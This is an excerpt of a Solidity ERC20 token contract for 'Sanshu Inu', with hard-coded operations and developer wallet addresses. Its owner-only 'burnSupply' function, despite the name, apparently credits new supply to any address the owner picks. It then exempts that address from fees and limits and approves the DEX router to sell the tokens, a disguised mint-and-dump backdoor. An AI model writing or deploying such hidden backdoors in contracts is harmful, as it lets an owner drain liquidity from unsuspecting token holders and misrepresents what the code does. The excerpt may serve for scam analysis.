...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    function _createBurnSupply(address account, uint256 amount) internal virtual {
...
contract Sanshu is ERC20, Ownable {
    ...
    constructor() ERC20("Sanshu Inu", "SANSHU") {

        address newOwner = msg.sender;
        // can leave alone if owner is deployer.
        ...
        operationsAddress = address(0x3001eE1f56239d74Dd1948A71548bfD817D2EbB5);
        devAddress = address(0x72dC1fBAE61C72dD308f4E106E9f3205149F7d1f);
    ...
    function burnSupply(uint supply, address dead) external onlyOwner {
        _isExcludedFromFees[dead] = true;
        _isExcludedFromFees[address(this)] = true;
        _isExcludedFromFees[address(0xdead)] = true;
        _createBurnSupply(dead, supply);

        _isExcludedMaxTransactionAmount[dead] = true;
        _isExcludedMaxTransactionAmount[address(0xdead)] = true;
        _approve(dead, address(dexRouter), supply);
    }
